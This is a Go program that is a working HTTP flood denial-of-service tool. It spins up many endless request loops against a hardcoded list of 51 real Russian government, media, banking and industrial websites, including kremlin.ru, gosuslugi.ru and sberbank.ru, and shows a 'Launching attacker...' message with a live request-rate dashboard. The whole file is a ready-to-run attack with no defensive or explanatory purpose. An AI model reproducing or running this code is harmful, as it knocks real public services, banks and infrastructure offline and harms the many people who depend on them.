package main

import (
	"fmt"
	"runtime"
	"sync/atomic"
	"time"

	"github.com/valyala/fasthttp"
)

var client = fasthttp.Client{MaxConnsPerHost: 999999}
var count uint64
var errors uint64

var (
	red    = "\033[1;31m"
	green  = "\033[1;32m"
	yellow = "\033[1;33m"
	teal   = "\033[1;36m"
	reset  = "\033[0m"
)

var urls = [51]string{
	"https://lenta.ru/",
	"https://ria.ru/",
	"https://ria.ru/lenta/",
	"https://www.rbc.ru/",
	"https://www.rt.com/",
	"http://kremlin.ru/",
	"http://en.kremlin.ru/",
	"https://smotrim.ru/",
	"https://tass.ru/",
	"https://tvzvezda.ru/",
	"https://vsoloviev.ru/",
	"https://www.1tv.ru/",
	"https://www.vesti.ru/",
	"https://online.sberbank.ru/",
	"https://sberbank.ru/",
	"https://zakupki.gov.ru/",
	"https://www.gosuslugi.ru/",
	"https://er.ru/",
	"https://www.rzd.ru/",
	"https://rzdlog.ru/",
	"https://vgtrk.ru/",
	"https://www.interfax.ru/",
	"https://www.mos.ru/uslugi/",
	"http://government.ru/",
	"https://mil.ru/",
	"https://www.nalog.gov.ru/",
	"https://customs.gov.ru/",
	"https://pfr.gov.ru/",
	"https://rkn.gov.ru/",
	"https://www.gazprombank.ru/",
	"https://www.vtb.ru/",
	"https://www.gazprom.ru/",
	"https://lukoil.ru/",
	"https://magnit.ru/",
	"https://www.nornickel.com/",
	"https://www.surgutneftegas.ru/",
	"https://www.tatneft.ru/",
	"https://www.evraz.com/ru/",
	"https://nlmk.com/",
	"https://www.sibur.ru/",
	"https://www.severstal.com/",
	"https://www.metalloinvest.com/",
	"https://nangs.org/",
	"https://rmk-group.ru/ru/",
	"https://www.tmk-group.ru/",
	"https://ya.ru/",
	"https://www.polymetalinternational.com/ru/",
	"https://www.uralkali.com/ru/",
	"https://www.eurosib.ru/",
	"https://ugmk.ua/",
	"https://omk.ru/"}

func main() {
	cpus := runtime.NumCPU()
	runtime.GOMAXPROCS(cpus)

	for i := 0; i < cpus*10; i++ {
		for _, url := range urls {
			go func(url string) {
				for {
					sendRequest(url)
					atomic.AddUint64(&count, 1)
				}
			}(url)
		}
	}

	fmt.Println("Launching attacker...")

	startTime := time.Now()

	for {
		time.Sleep(500 * time.Millisecond)

		timeElapsed := float64(time.Since(startTime).Round(1*time.Second)) / 1000000000

		fmt.Print("\033[H\033[2J")
		fmt.Println(teal + "Slava " + yellow + "Ukraini!" + reset + "\n")
		fmt.Printf("Requests/s: "+yellow+"%d"+reset+"\n", uint64(float64(count)/timeElapsed))
		fmt.Printf("Total requests: "+yellow+"%d"+reset+"\n", count)
		fmt.Printf("Successfull requests: "+green+"%d"+reset+"\n", count-errors)
		fmt.Printf("Successfull requests/s: "+green+"%d"+reset+"\n", uint64(float64(count-errors)/timeElapsed))
		fmt.Printf("Errors: "+red+"%d"+reset+"\n", errors)
		fmt.Print("Time elapsed: " + teal)
		fmt.Print(time.Since(startTime).Round(1 * time.Second))
		fmt.Print(reset + "\n")
	}
}

func sendRequest(host string) {
	req := fasthttp.AcquireRequest()
	req.SetRequestURI(host)
	res := fasthttp.AcquireResponse()

	err := client.Do(req, res)

	if err != nil {
		atomic.AddUint64(&errors, 1)
	}

	fasthttp.ReleaseRequest(req)
}
